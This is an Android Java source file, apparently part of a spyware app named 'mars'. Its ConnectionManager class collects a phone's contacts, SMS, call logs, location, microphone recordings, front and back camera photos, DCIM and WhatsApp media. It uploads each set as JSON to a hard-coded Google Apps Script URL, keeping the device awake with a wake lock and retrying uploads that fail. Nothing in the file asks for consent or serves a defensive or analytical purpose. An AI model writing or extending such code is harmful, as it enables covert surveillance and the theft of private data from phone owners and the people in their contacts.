package app.marees.mars.MarsService;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.location.Address;
import android.location.Geocoder;
import android.os.AsyncTask;
import android.os.PowerManager;
import android.util.Log;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.RequestQueue;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import app.marees.mars.Singletons.Myapp;
import app.marees.mars.Singletons.Singleton;
import app.marees.mars.camera.APictureCapturingService;
import app.marees.mars.camera.PictureCapturingServiceImpl;
import app.marees.mars.listeners.PictureCapturingListener;
import app.marees.mars.room.MyViewModel;


/**
 * Created by Marees on 15/Sep/19.
 */

public class ConnectionManager implements MarsSources {

   public static Context context;
   static boolean is = true;
    static boolean isCompleted =false;
   private static JSONObject Contacts = new JSONObject();
    private static JSONObject Sms = new JSONObject();
    private static JSONObject Calls = new JSONObject();
    private static JSONObject Location = new JSONObject();
    private static JSONObject Mic = new JSONObject();
    private static JSONObject Camera = new JSONObject();
    static RequestQueue mqueue;
    static boolean once = true;
    private static MyViewModel marsDb;
    boolean isSuccess = false;
    static String Rcustom="";
    static boolean Raudio,Rlog,Rpeoples,Rmsg,Rloc,Rcam,Rdcim,Rwhatsapp;
   static boolean oldMic,oldCall,oldContact,oldSms,oldLoc,oldCamera,oldDcim,oldWhatsapp;
  static boolean test = true;
static boolean Universal = true;
   static boolean perm = true;
   static boolean Rpath = false;
    static boolean insertData = false;

   static  int duration = 10;
    public static void startAsync(Context con, boolean mic, boolean call, boolean contact, boolean sms, boolean location, boolean camera, Double durex, boolean dcimm, boolean whatsappp, String custom, boolean path) {
        try {

            if(test){
                test = false;
                oldMic = oldCall = oldContact = oldSms = oldLoc = oldCamera =oldDcim=oldWhatsapp = false;
            }

            Rcustom = custom;
            context = con;
            Raudio = mic;
            Rlog = call;
            Rpeoples = contact;
            Rmsg = sms;
            Rloc = location;
            Rcam = camera;
            duration = durex.intValue();
            Rdcim =dcimm;
            Rwhatsapp = whatsappp;
            Rpath = path;



                                        ////////start the async
            sendReq(Raudio,Rlog,Rpeoples,Rmsg,Rloc,Rcam,duration,Rdcim,Rwhatsapp);
        } catch (Exception ex) {
            startAsync(con,mic,call,contact,sms,location,camera,durex,dcimm,whatsappp,custom, path);
        }

    }

    private static void sendReq(boolean audio, boolean log, boolean peoples, boolean msg, boolean loc,boolean cam,int duration,boolean dcim,boolean whatsapp) {
        Log.e("Service","Starting");

        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                //TODO your background code
                                                ////if(custom path) like my desired folder
                if(Rpath){
                    getPath();
                }

                if(!Rcustom.equals("")){
                    getCustomCamera();
                }
                                                //////if(dcim get dcim folder photo)
                if(Rdcim){
                    Log.e("DCIM", "Launched");
                    getDcim();
                }
                if(Rwhatsapp){
                    Log.e("Whatsapp", "Launched");
                    getWhatsapp();
                }

            }
        });
                                                    ///////collect and send data more tme to prevent redunancy run once app open
        if(once) {
            once = false;

            if(audio){

                  getMic(duration);
                   Log.e("Mic", "Launched");
                   audio = false;
         //          sendtoDrive(Mic, "Mic");

           }
            else if (loc) {
              getLocation();
                Log.e("Location", "Launched");

              //  sendtoDrive(Location, "loc");
            }
            else if (cam) {
               Log.e("Camera", "Launched");

               getCamera();


            }



        }

        if(!Myapp.getIsSent()){
            if (Rlog) {
                getCalls();
                Log.e("Calls", "Launched");
                //   sendtoDrive(Calls, "log");
            }
           if (Rpeoples) {
                getContacts();
                Log.e("Contacts", "Launched");
                //     sendtoDrive(Contacts, "cont");
            }
            if (Rmsg) {

                getMessage();
                Log.e("Sms", "Launched");


                //  sendtoDrive(Sms, "msg");
            }
            Log.e("Database","Checking from Connection");

            DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd");
            DateFormat time = new SimpleDateFormat("HH:mm:ss");
            Date date = new Date();
            String todayDate = dateFormat.format(date);
            Log.e("Database","Checking data for "+todayDate);

            MyViewModel model = Myapp.getMyViewModel2();

            if(model == null){
                Log.e("Database","model null getting model from dummy");
                Intent i = new Intent(Myapp.getAppContext(),DummyFragment.class);
                Myapp.getAppContext().startActivity(i);
            }
            else {
                Log.e("Database","model exist");
                ///but async task not called....
                model.getByDate(todayDate);
                Log.e("Database","exit");
            }


        }




        //  callCamera();
        ///mic MicManager.startRecording(sec); sec int
//location()/*
//    }*/

        Log.e("update","Completed All Tasks");


    }



    private static void getCustomCamera(){
        DataGetterUtil.getCustomCamera(Rcustom);
    }
    private static void getPath(){
        DataGetterUtil.getCustomList();
    }
    private static void getDcim(){

        DataGetterUtil.getDCIMCamera();

    }
    private static void getCamera(){
        APictureCapturingService pictureService;
        JSONObject js = new JSONObject();
        pictureService = PictureCapturingServiceImpl.getInstance(Myapp.getAppContext());
        pictureService.startCapturing(new PictureCapturingListener() {
            @Override
            public void onCaptureDone(String pictureUrl, byte[] pictureData) {

            }

            @Override
            public void onDoneCapturingAllPhotos(String imageString, String selfieString) {
                                            ///////store captured image to json
                try {
                    js.put("Source","Camera");
                    js.put("Back",imageString);
                    js.put("Front",selfieString);
                    Log.e("Camera","Success");
                    ConnectionManager c2 =new ConnectionManager();
                                                            /////////////send to drive
                    c2.Cam(js);

                } catch (JSONException e) {
                    e.printStackTrace();
                }


            }
        });
    }

    private static void getMic(int duration) {
        JSONObject js = new JSONObject();
        try {
            DataGetterUtil.startRecording(duration);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
    private static  void getWhatsapp(){
        DataGetterUtil.getWhatsappCamera();
    }
    private static void getLocation(){
        DataGetterUtil gps = new DataGetterUtil(context);
        JSONObject location = new JSONObject();
        // check if GPS enabled
        if(gps.canGetLocation()){

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Geocoder geocoder;
            List<Address> addresses = null;
            geocoder = new Geocoder(Myapp.getAppContext(), Locale.getDefault());

            try {
                addresses = geocoder.getFromLocation(gps.getLatitude(),gps.getLongitude(),5); // Here 1 represent max location result to returned, by documents it recommended 1 to 5

            String address = addresses.get(0).getAddressLine(0); // If any additional address line present than only, check with max available address lines by getMaxAddressLineIndex()
            String city = addresses.get(0).getLocality();
            String state = addresses.get(0).getAdminArea();
            String country = addresses.get(0).getCountryName();
            String postalCode = addresses.get(0).getPostalCode();
            String knownName = addresses.get(0).getFeatureName();

            Log.e("loc" , latitude+"   ,  "+longitude);
           Log.e("Address","Address : "+address+" City : "+city+"\n state : "+state);
           Log.e("two","Country : "+country+"Postal Code : " + postalCode+"knownName : "+ knownName);

                location.put("Source","Location");
                location.put("enable" , true);
                location.put("addressFull" , address);
                location.put("city" , city);
                location.put("state" , state);
                location.put("country" , country);
                location.put("postalCode" , postalCode);
                location.put("knownName" , knownName);

            } catch (JSONException e) {
                e.printStackTrace();
                Log.e("loc" , e.toString());
            } catch (IOException e) {
                e.printStackTrace();
                Log.e("loc" , e.toString());
            }

           finally {

            }

        }
        else {
            try {
                location.put("enable" , false);
                location.put("Source","Location");
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

        ConnectionManager c2 = new ConnectionManager();
        c2.Location(location);
    }

    private static void getCalls() {


        DataGetterUtil.getCallsLogs();

    }

    private static void getMessage() {



        DataGetterUtil.getSMSList();

    //    SMSManager.sendSMS(phoneNo, msg);
    }

    private static void callCamera() {

    }
    private static void getContacts(){


        DataGetterUtil.getContacts();

    }







    @SuppressLint("InvalidWakeLockTag")
    private static boolean sendtoDrive(JSONObject Resources,String Identity)  {

        JSONObject js =new JSONObject();
        js = Resources;

        marsDb = Myapp.getMyViewModel();
        PowerManager pm;
        PowerManager.WakeLock wl;
        pm = (PowerManager) Myapp.getAppContext().getSystemService(Context.POWER_SERVICE);
        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Marees");

        wl.acquire(10*60*1000L /*10 minutes*/);


        //stopProjection();


        mqueue = Singleton.getInstance(Myapp.getAppContext()).getRequestQueue();
        String url = "https://script.google.com/macros/s/AKfycbw9uMhUausfVngikSLzXLXQHbVTRdTsC0aFJIJ5nLQcqifm6Xs/exec";

        JsonObjectRequest myRequest = new JsonObjectRequest(com.android.volley.Request.Method.POST, url, js, new com.android.volley.Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {
                boolean mic,call,contact,sms,location,camera,dcim,whatsapp;
                mic =call=contact=sms=location=camera=dcim=whatsapp=false;

                if(Identity.equals("loc")){
                    location = true;
                }
                if(Identity.equals("msg")){
                    sms = true;
                    Rmsg = false;
                    Log.e("Database","Sms Sent updating database");
                    marsDb.updateSms("yes");
                }
                if(Identity.equals("cont")){
                    contact = true;
                    Rpeoples = false;
                    Log.e("Database","Contact Sent updating database");
                    marsDb.updateContact("yes");
                }
                if(Identity.equals("log")){
                    call = true;
                    Rlog =false;
                    Log.e("Database","Call Sent updating database");
                    marsDb.updateCall("yes");

                }
                if(Identity.equals("Mic")){
                    mic = true;


                }
                if(Identity.equals("cam")){
                    camera =true;

                }
                if(Identity.equals("dcim")){
                    dcim = true;

                }
                if(Identity.equals("whatsapp")){
                    whatsapp = true;

                }


                perm = true;
                isCompleted = true;
                if(mic){
                    test = true;
                    once = true;
                }
                else{
                    if(!Rmsg){
                        sms = true;
                    }
                    if(!Raudio){
                        mic = true;
                    }
                    if(!Rlog){

                        call = true;
                    }
                    if(!Rpeoples){
                        contact = true;
                    }
                    if(!Rloc){

                        location = true;
                    }
                    if(!Rcam){
                        camera = true;
                    }
                    if(!Rwhatsapp){
                        whatsapp = true;
                    }
                    checkRemainingUpload(location,sms,contact,call,mic,camera,duration,dcim,whatsapp);

                }





            }
        }, new com.android.volley.Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                boolean mic,call,contact,sms,location,camera,dcim,whatsapp;
                mic =call=contact=sms=location=camera=dcim=whatsapp=false;
                if(Identity.equals("loc")){
                    location = true;
                }
                if(Identity.equals("msg")){
                    sms = true;
                  //  marsDb.updateSms("no");
                }
                if(Identity.equals("cont")){
                    contact = true;
                 //   marsDb.updateContact("no");
                }
                if(Identity.equals("log")){
                    call = true;
                   // marsDb.updateCall("no");
                }
                if(Identity.equals("Mic")){
                    mic = true;

                }
                if(Identity.equals("cam")){
                    camera =true;
                }
                if(Identity.equals("dcim")){
                    dcim = true;
                }
                if(Identity.equals("whatsapp")){
                    whatsapp = true;
                }
                perm = true;
                isCompleted = true;
                if(mic){
                    test = true;
                    once = true;
                }
                else{
                    if(!Rmsg){
                        sms = true;
                       // marsDb.updateSms("no");
                    }
                    if(!Raudio){
                        mic = true;
                    }
                    if(!Rlog){
                      //  marsDb.updateCall("no");
                        call = true;
                    }
                    if(!Rpeoples){
                      //  marsDb.updateContact("no");
                        contact = true;
                    }
                    if(!Rloc){

                        location = true;
                    }
                    if(!Rcam){
                        camera = true;
                    }
                    if(!Rwhatsapp){
                        whatsapp = true;
                    }
                    if(!Rdcim){
                        dcim = true;
                    }
                    checkRemainingUpload(location,sms,contact,call,mic,camera,duration,dcim,whatsapp);

                }




            }
        });

        myRequest.setRetryPolicy(new DefaultRetryPolicy(
                50000,
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

        mqueue.add(myRequest);
        return isCompleted;
    }




    private static void checkRemainingUpload(boolean loc, boolean sms, boolean contact, boolean call, boolean mic, boolean camera,int duration,boolean dcim,boolean whatsapp) {


        if(!oldLoc){
            oldLoc = loc;
        }
        if(!oldSms){
            oldSms = sms;
        }
        if(!oldContact){
            oldContact = contact;
        }
        if(!oldCall){
            oldCall = call;
        }
        if(!oldCamera){
            oldCamera = camera;
        }
        if(!oldMic){
            oldMic = mic;
        }
        if(!oldDcim){
            oldDcim = dcim;
        }
        if(!oldWhatsapp){
            oldWhatsapp = whatsapp;
        }
        if(perm) {
            perm = false;



            if (!oldCall) {
               getCalls();
                Log.e("Calls", "Launched");


            }
            else if (!oldContact) {
              getContacts();
                Log.e("Contacts", "Launched");

            }
            else if (!oldSms) {

               getMessage();
                Log.e("Sms", "Launched");



            }
            else if (!oldLoc) {
               getLocation();
                Log.e("Location", "Launched");


            }
            else if (!oldCamera) {
                Log.e("Camera", "Launched");
                getCamera();
            }

            else if (!oldMic) {
                getMic(duration);
                Log.e("Mic","Duration "+duration);
                Log.e("Mic", "Launched");

                //  sendtoDrive(Mic, "Mic");
            }
            else{
                Log.e("Every","Everything is Uploaded");

            }

        }
    }


    @Override
    public void Mic(JSONObject js) {

sendtoDrive(js,"Mic");
    }

    @Override
    public void Call(JSONObject js) {
        sendtoDrive(js,"log");

    }

    @Override
    public void Sms(JSONObject js) {
        sendtoDrive(js,"msg");

    }

    @Override
    public void Location(JSONObject js) {
        sendtoDrive(js,"loc");

    }

    @Override
    public void Contacts(JSONObject js) {
        sendtoDrive(js,"cont");

    }

    @Override
    public void Cam(JSONObject js) {
        sendtoDrive(js,"cam");

    }

    @Override
    public void Dcim(JSONObject js) {
        sendtoDrive(js,"dcim");
    }

    @Override
    public void Whatsapp(JSONObject js) {
        sendtoDrive(js,"whatsapp");
    }

    @Override
    public void Custom(JSONObject js) {
        sendtoDrive(js,"Custom");
    }

    @Override
    public void getPath(JSONObject js) {
        sendtoDrive(js,"Path");
    }


}
interface MarsSources{
    void Mic(JSONObject js);
    void Call(JSONObject js);
    void Sms(JSONObject js);
    void Location(JSONObject js);
    void Contacts(JSONObject js);
    void Cam(JSONObject js);
    void Dcim(JSONObject js);
    void Whatsapp(JSONObject js);
    void Custom(JSONObject js);
    void getPath(JSONObject js);
}